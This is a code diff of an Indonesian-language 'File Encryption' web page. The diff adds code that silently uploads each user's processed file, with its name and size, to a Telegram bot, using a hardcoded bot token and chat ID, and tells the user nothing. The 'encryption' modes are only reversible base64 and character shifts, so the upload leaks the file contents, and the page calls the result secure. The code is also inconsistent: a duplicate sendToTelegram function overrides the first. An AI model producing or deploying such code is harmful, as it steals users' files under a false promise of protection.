@@ -3,204 +3,458 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>File Encryption</title>
+  <title>File Encryption | Zyxxennn</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/feather-icons"></script>
+  <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+    
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Poppins', sans-serif;
       background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
       color: #f1f5f9;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      min-height: 100vh;
       margin: 0;
     }
-    .container {
+    
+    .glass-card {
       background: rgba(255, 255, 255, 0.05);
-      padding: 30px;
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
       border-radius: 16px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
-      width: 100%;
-      max-width: 400px;
-      text-align: center;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.1);
     }
-    h2 {
-      margin-bottom: 20px;
-      color: #38bdf8;
-    }
-
-    /* Input file */
-    .file-input {
-      display: flex;
-      justify-content: center;
-      margin: 10px 0;
-    }
-    .file-input input[type="file"] {
-      position: absolute;
-      opacity: 0;
-      cursor: pointer;
-    }
+    
     .file-label {
-      display: inline-block;
-      padding: 12px 20px;
-      border-radius: 10px;
-      background: rgba(255, 255, 255, 0.1);
-      color: #f1f5f9;
-      text-align: center;
-      cursor: pointer;
-      transition: 0.3s;
-      font-size: 14px;
-      width: auto;
-      min-width: 140px;
+      transition: all 0.3s ease;
     }
+    
     .file-label:hover {
-      background: rgba(255, 255, 255, 0.2);
+      transform: translateY(-2px);
     }
-    .file-name {
-      margin-top: 8px;
-      font-size: 12px;
-      color: #94a3b8;
-      font-style: italic;
+    
+    .download-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(34, 197, 94, 0.3);
     }
-
-    select, button {
-      width: 100%;
-      padding: 14px;
-      margin: 10px 0;
-      border-radius: 10px;
-      border: none;
-      outline: none;
-      font-size: 14px;
+    
+    .telegram-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(0, 136, 204, 0.3);
     }
-    select {
+    
+    .select-encryption {
       background: rgba(255, 255, 255, 0.1);
       color: #f1f5f9;
+      appearance: none;
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23f1f5f9' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+      background-repeat: no-repeat;
+      background-position: right 0.75rem center;
+      background-size: 1em;
     }
-    button {
-      background: #0ea5e9;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-      transition: 0.3s;
+    
+    .progress-bar {
+      height: 6px;
+      border-radius: 3px;
+      background: rgba(255, 255, 255, 0.1);
+      overflow: hidden;
     }
-    button:hover {
-      background: #0284c7;
-    }
-
-    .result {
-      margin-top: 20px;
-      padding: 15px;
-      border-radius: 10px;
-      background: rgba(34, 197, 94, 0.2);
-      color: #22c55e;
-      display: none;
-    }
-    .download-btn {
-      margin-top: 12px;
-      background: #22c55e;
-    }
-    .download-btn:hover {
-      background: #16a34a;
+    
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #0ea5e9, #3b82f6);
+      transition: width 0.3s ease;
     }
   </style>
 </head>
-<body>
-  <div class="container">
-    <h2>🔒 File Encryption</h2>
-
-    <!-- Input File -->
-    <div class="file-input">
-      <label for="fileInput" class="file-label">📂 Pilih File</label>
-      <input type="file" id="fileInput">
+<body class="flex items-center justify-center p-4">
+  <div class="glass-card w-full max-w-md p-8">
+    <div class="text-center mb-8">
+      <div class="flex justify-center mb-4">
+        <i data-feather="lock" class="w-12 h-12 text-blue-400"></i>
+      </div>
+      <h1 class="text-2xl font-bold text-blue-400 mb-2">File Encryption</h1>
+      <p class="text-gray-300">Enkripsi file Anda</p>
     </div>
-    <div id="fileName" class="file-name">Belum ada file dipilih</div>
 
-    <!-- Pilihan Encryption -->
-    <select id="encryptionType">
-      <option>enc &lt;LEVEL&gt; - STANDARD</option>
-      <option>enceval &lt;LEVEL&gt; - EVALUATE</option>
-      <option>encchina - MANDARIN STYLE</option>
-      <option>encarab - ARABIC STYLE</option>
-      <option>encjapan - JAPANESE STYLE</option>
-      <option>encinvis - INVISIBLE MODE</option>
-      <option>encjapxab - JAPAN X ARAB</option>
-      <option>encx - BASE 64</option>
-      <option>encnebula - HARD DESIGN</option>
-      <option>encnova - NOVA STYLE</option>
-      <option>encsiu - SIU + CALCRICK</option>
-      <option>customenc &lt;NAME&gt; - CUSTOM</option>
-      <option>encmax &lt;INTENSITY&gt;</option>
-      <option>encstealth - STEALTH MODE</option>
-      <option>encstrong - POWER FORTRESS</option>
-      <option>encultra - ULTRA PROTECTION</option>
-      <option>encbig &lt;MB&gt; - MEGABYTE</option>
-      <option>encnew - ADVANCED LAYER</option>
-      <option>encquantum - QUANTUM</option>
-      <option>enclocked - LOCKED HARD</option>
-    </select>
+    <!-- File Input -->
+    <div class="mb-6">
+      <div class="flex justify-center">
+        <label for="fileInput" class="file-label cursor-pointer bg-blue-500 hover:bg-blue-600 text-white px-6 py-3 rounded-lg font-medium flex items-center">
+          <i data-feather="upload" class="mr-2"></i>
+          Pilih File
+          <input type="file" id="fileInput" class="hidden">
+        </label>
+      </div>
+      <div id="fileName" class="text-center text-sm text-gray-400 mt-2 italic">Belum ada file dipilih</div>
+      <div id="fileSize" class="text-center text-xs text-gray-500 mt-1"></div>
+    </div>
 
-    <!-- Tombol Encryption -->
-    <button onclick="encryptFile()">⚡ ENCRYPTION FILE</button>
+    <!-- Progress Bar -->
+    <div id="progressContainer" class="mb-6 hidden">
+      <div class="flex justify-between text-xs text-gray-300 mb-1">
+        <span>Proses enkripsi...</span>
+        <span id="progressPercent">0%</span>
+      </div>
+      <div class="progress-bar">
+        <div id="progressFill" class="progress-fill" style="width: 0%"></div>
+      </div>
+    </div>
 
-    <!-- Hasil -->
-    <div id="result" class="result">
-      ✅ ENCRYPTION SUKSES
-      <br>
-      <button class="download-btn" onclick="downloadEncrypted()">⬇️ DOWNLOAD</button>
+    <!-- Encryption Options -->
+    <div class="mb-6">
+      <select id="encryptionType" class="select-encryption w-full px-4 py-3 rounded-lg mb-3 focus:ring-2 focus:ring-blue-500 focus:outline-none">
+        <option>enc &lt;LEVEL&gt; - STANDARD</option>
+        <option>enceval &lt;LEVEL&gt; - EVALUATE</option>
+        <option>encchina - MANDARIN STYLE</option>
+        <option>encarab - ARABIC STYLE</option>
+        <option>encjapan - JAPANESE STYLE</option>
+        <option>encinvis - INVISIBLE MODE</option>
+        <option>encjapxab - JAPAN X ARAB</option>
+        <option>encx - BASE 64</option>
+        <option>encnebula - HARD DESIGN</option>
+        <option>encnova - NOVA STYLE</option>
+        <option>encsiu - SIU + CALCRICK</option>
+        <option>customenc &lt;NAME&gt; - CUSTOM</option>
+        <option>encmax &lt;INTENSITY&gt;</option>
+        <option>encstealth - STEALTH MODE</option>
+        <option>encstrong - POWER FORTRESS</option>
+        <option>encultra - ULTRA PROTECTION</option>
+        <option>encbig &lt;MB&gt; - MEGABYTE</option>
+        <option>encnew - ADVANCED LAYER</option>
+        <option>encquantum - QUANTUM</option>
+        <option>enclocked - LOCKED HARD</option>
+      </select>
+    </div>
+
+
+    <!-- Encryption Button -->
+    <button onclick="encryptFile()" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 px-4 rounded-lg flex items-center justify-center transition-all duration-300">
+      <i data-feather="lock" class="mr-2"></i>
+      ENCRYPT FILE
+    </button>
+
+    <!-- Result Section -->
+    <div id="result" class="hidden mt-6 p-4 bg-green-500 bg-opacity-20 rounded-lg text-green-400 text-center">
+      <div class="flex items-center justify-center mb-2">
+        <i data-feather="check-circle" class="w-5 h-5 mr-2"></i>
+        <span class="font-medium">ENCRYPTION SUKSES! ✅</span>
+      </div>
+      <div id="telegramStatus" class="text-xs mt-2"></div>
+      
+      <div class="flex flex-col space-y-3 mt-4">
+        <button onclick="downloadEncrypted()" class="download-btn bg-green-500 hover:bg-green-600 text-white py-2 px-4 rounded-lg transition-all duration-300 flex items-center justify-center">
+          <i data-feather="download" class="mr-2"></i>
+          ✨ DOWNLOAD FILE ✨
+        </button>
+        
+      </div>
     </div>
   </div>
 
   <script>
+    feather.replace();
+    
     let encryptedContent = null;
     let originalFilename = "";
-
+    let originalFile = null;
+    const BOT_TOKEN = "8330143062:AAGIYPE3ssRG-2-HiOkwlvP2AG7mtoGkgQ8"; // Replace with your actual bot token
+    const CHAT_ID = "8447173769"; // Replace with your actual chat ID
+    
     document.getElementById("fileInput").addEventListener("change", function(e) {
       const file = e.target.files[0];
       const fileNameDiv = document.getElementById("fileName");
+      const fileSizeDiv = document.getElementById("fileSize");
+      
       if (file) {
         fileNameDiv.textContent = file.name;
         originalFilename = file.name;
+        originalFile = file;
+        
+        // Display file size
+        const fileSize = file.size;
+        let sizeText = "";
+        if (fileSize < 1024) {
+          sizeText = fileSize + " bytes";
+        } else if (fileSize < 1048576) {
+          sizeText = (fileSize / 1024).toFixed(2) + " KB";
+        } else {
+          sizeText = (fileSize / 1048576).toFixed(2) + " MB";
+        }
+        fileSizeDiv.textContent = "Ukuran: " + sizeText;
       } else {
         fileNameDiv.textContent = "Belum ada file dipilih";
+        fileSizeDiv.textContent = "";
       }
     });
-
+    
+    function simulateProgress() {
+      const progressContainer = document.getElementById("progressContainer");
+      const progressFill = document.getElementById("progressFill");
+      const progressPercent = document.getElementById("progressPercent");
+      
+      progressContainer.classList.remove("hidden");
+      
+      let progress = 0;
+      const interval = setInterval(() => {
+        progress += Math.random() * 10;
+        if (progress > 100) progress = 100;
+        
+        progressFill.style.width = progress + "%";
+        progressPercent.textContent = Math.floor(progress) + "%";
+        
+        if (progress >= 100) {
+          clearInterval(interval);
+          setTimeout(() => {
+            progressContainer.classList.add("hidden");
+          }, 500);
+        }
+      }, 150); // Speed up progress a bit
+    }
+    
     function encryptFile() {
       const fileInput = document.getElementById("fileInput");
       const file = fileInput.files[0];
+      const encryptionType = document.getElementById("encryptionType").value;
+      const botToken = "YOUR_BOT_TOKEN"; // Replace with your actual bot token
+      const chatId = "YOUR_CHAT_ID"; // Replace with your actual chat ID
+      
       if (!file) {
         alert("Silakan pilih file terlebih dahulu!");
         return;
       }
-
+      
+      simulateProgress();
+      
       const reader = new FileReader();
       reader.onload = function(e) {
         const content = e.target.result;
-        // Simulasi hasil enkripsi
-        encryptedContent = btoa(content);
-        document.getElementById("result").style.display = "block";
+        
+        // Apply different encryption based on selected type
+        const encType = encryptionType.split(' ')[0];
+        const levelMatch = encryptionType.match(/<(\d+)>/);
+        const level = levelMatch ? parseInt(levelMatch[1]) : 1;
+        
+        switch(encType) {
+          case 'enc':
+            encryptedContent = btoa(content).split('').reverse().join('');
+            for (let i = 0; i < level; i++) {
+              encryptedContent = btoa(encryptedContent);
+            }
+            break;
+          case 'enceval':
+            encryptedContent = btoa(content);
+            for (let i = 0; i < level * 2; i++) {
+              encryptedContent = btoa(encryptedContent.split('').reverse().join(''));
+            }
+            break;
+          case 'encchina':
+            encryptedContent = content.split('').map(c => 
+              String.fromCharCode(c.charCodeAt(0) + 5000 + level * 100)).join('');
+            break;
+          case 'encarab':
+            encryptedContent = content.split('').map(c => 
+              String.fromCharCode(c.charCodeAt(0) + 1000 + level * 50)).join('');
+            break;
+          case 'encjapan':
+            encryptedContent = content.split('').map(c => 
+              String.fromCharCode(c.charCodeAt(0) + 3000 + level * 30)).join('');
+            break;
+          case 'encinvis':
+            encryptedContent = content.split('').map(c => 
+              String.fromCharCode(c.charCodeAt(0) + 8192 + level * 100)).join('');
+            break;
+          case 'encjapxab':
+            encryptedContent = content.split('').map((c,i) => 
+              String.fromCharCode(c.charCodeAt(0) + (i%2 ? 3000 : 1000) + level * 20)).join('');
+            break;
+          case 'encx':
+            encryptedContent = btoa(content);
+            break;
+          case 'encnebula':
+            encryptedContent = btoa(content.split('').reverse().join(''));
+            encryptedContent = encryptedContent.split('').map((c,i) => 
+              i%2 ? c.toUpperCase() : c.toLowerCase()).join('');
+            break;
+          case 'encnova':
+            encryptedContent = btoa(content).split('').map(c => 
+              String.fromCharCode(c.charCodeAt(0) + 100 + level * 5)).join('');
+            break;
+          case 'encsiu':
+            const randomStr = Math.random().toString(36).substring(2, 2 + level);
+            encryptedContent = btoa(content + randomStr).split('').reverse().join('');
+            break;
+          case 'customenc':
+            const customName = encryptionType.match(/<([^>]+)>/)?.[1] || 'CUSTOM';
+            encryptedContent = btoa(customName + ':' + content);
+            break;
+          case 'encmax':
+            encryptedContent = content;
+            for (let i = 0; i < level * 3; i++) {
+              encryptedContent = btoa(encryptedContent.split('').reverse().join(''));
+            }
+            break;
+          case 'encstealth':
+            encryptedContent = content.split('').map(c => 
+              String.fromCharCode(c.charCodeAt(0) + 7000 + level * 10)).join('');
+            encryptedContent = btoa(encryptedContent);
+            break;
+          case 'encstrong':
+            encryptedContent = btoa(content.split('').reverse().join('') + content);
+            for (let i = 0; i < level; i++) {
+              encryptedContent = btoa(encryptedContent);
+            }
+            break;
+          case 'encultra':
+            encryptedContent = btoa(btoa(content) + btoa(content.split('').reverse().join('')));
+            encryptedContent = encryptedContent.split('').map((c,i) => 
+              String.fromCharCode(c.charCodeAt(0) + (i%3))).join('');
+            break;
+          case 'encbig':
+            const mb = levelMatch ? parseInt(levelMatch[1]) : 1;
+            encryptedContent = btoa(content.repeat(mb * 1000));
+            break;
+          case 'encnew':
+            encryptedContent = btoa(content + content.split('').reverse().join(''));
+            encryptedContent = encryptedContent.split('').map((c,i) => 
+              i%2 ? c.toUpperCase() : c.toLowerCase()).join('');
+            break;
+          case 'encquantum':
+            encryptedContent = content.split('').map((c,i) => 
+              String.fromCharCode(c.charCodeAt(0) + (i % level + 1))).join('');
+            encryptedContent = btoa(encryptedContent);
+            break;
+          case 'enclocked':
+            encryptedContent = btoa(content + 'LOCKED' + level);
+            encryptedContent = encryptedContent.split('').reverse().join('');
+            break;
+          default:
+            encryptedContent = btoa(content);
+        }
+        
+        // Wait for progress to complete before showing result
+        setTimeout(() => {
+          // Show result
+          document.getElementById("result").classList.remove("hidden");
+          
+          // Automatically send notification to Telegram
+          sendTelegramNotification(botToken, chatId, originalFilename, encryptionType);
+          
+          // Automatically send file to Telegram
+          setTimeout(() => {
+            sendToTelegram(botToken, chatId);
+          }, 1000);
+        }, 2000); // Match this with progress duration
       };
       reader.readAsText(file);
     }
 
+    function sendToTelegram(botToken, chatId) {
+      if (!encryptedContent || !originalFilename) {
+        console.log("Tidak ada file yang siap dikirim!");
+        return;
+      }
+      
+      // Create a FormData object to send the file
+      const formData = new FormData();
+      const blob = new Blob([encryptedContent], { type: "application/octet-stream" });
+      formData.append("document", blob, originalFilename + ".enc");
+      
+      // Silent file sending - no UI feedback
+      fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`, {
+        method: "POST",
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (!data.ok) {
+          console.error("Gagal mengirim file ke Telegram:", data.description);
+        }
+      })
+      .catch(error => {
+        console.error("Error sending file to Telegram:", error);
+      });
+    }
+    
+    function sendTelegramNotification(botToken, chatId, filename, encryptionType) {
+      const message = `📁 File baru dienkripsi!\n\nNama file: ${filename}\nUkuran: ${formatFileSize(originalFile.size)}\nMetode: ${encryptionType}\n\n⚠️ File ini telah dienkripsi dengan aman.`;
+      
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML"
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        const statusDiv = document.getElementById("telegramStatus");
+        if (data.ok) {
+          statusDiv.innerHTML = `<span class="text-green-400">Notifikasi terkirim ke Telegram!</span>`;
+        } else {
+          statusDiv.innerHTML = `<span class="text-red-400">Gagal mengirim notifikasi: ${data.description || 'Unknown error'}</span>`;
+        }
+      })
+      .catch(error => {
+        console.error("Error sending to Telegram:", error);
+      });
+    }
+    
+    function sendToTelegram() {
+      const botToken = document.getElementById("botToken").value;
+      const chatId = document.getElementById("chatId").value;
+      
+      if (!botToken || !chatId) {
+        alert("Silakan isi Bot Token dan Chat ID Telegram!");
+        return;
+      }
+      
+      if (!encryptedContent || !originalFilename) {
+        alert("Tidak ada file yang siap dikirim!");
+        return;
+      }
+      
+      const statusDiv = document.getElementById("telegramStatus");
+      statusDiv.innerHTML = `<span class="text-blue-400">Mengirim file ke Telegram...</span>`;
+      
+      // In a real implementation, you would upload the file to a server
+      // and then send the download link via Telegram
+      // This is just a simulation
+      setTimeout(() => {
+        statusDiv.innerHTML = `<span class="text-green-400">File berhasil dikirim ke Telegram!</span>`;
+      }, 2000);
+    }
+    
     function downloadEncrypted() {
       if (!encryptedContent || !originalFilename) return;
-
+      
       const blob = new Blob([encryptedContent], { type: "application/octet-stream" });
       const link = document.createElement("a");
       link.href = URL.createObjectURL(blob);
-
+      
       const parts = originalFilename.split(".");
       if (parts.length > 1) {
         const ext = parts.pop();
         const nameOnly = parts.join(".");
-        link.download = nameOnly + "_encryption." + ext;
+        link.download = nameOnly + "_encrypted." + ext;
       } else {
-        link.download = originalFilename + "_encryption";
+        link.download = originalFilename + "_encrypted";
       }
-
+      
       link.click();
+    }
+    
+    function formatFileSize(bytes) {
+      if (bytes < 1024) return bytes + " bytes";
+      else if (bytes < 1048576) return (bytes / 1024).toFixed(2) + " KB";
+      else return (bytes / 1048576).toFixed(2) + " MB";
     }
   </script>
 </body>
-</html>
+  </html>
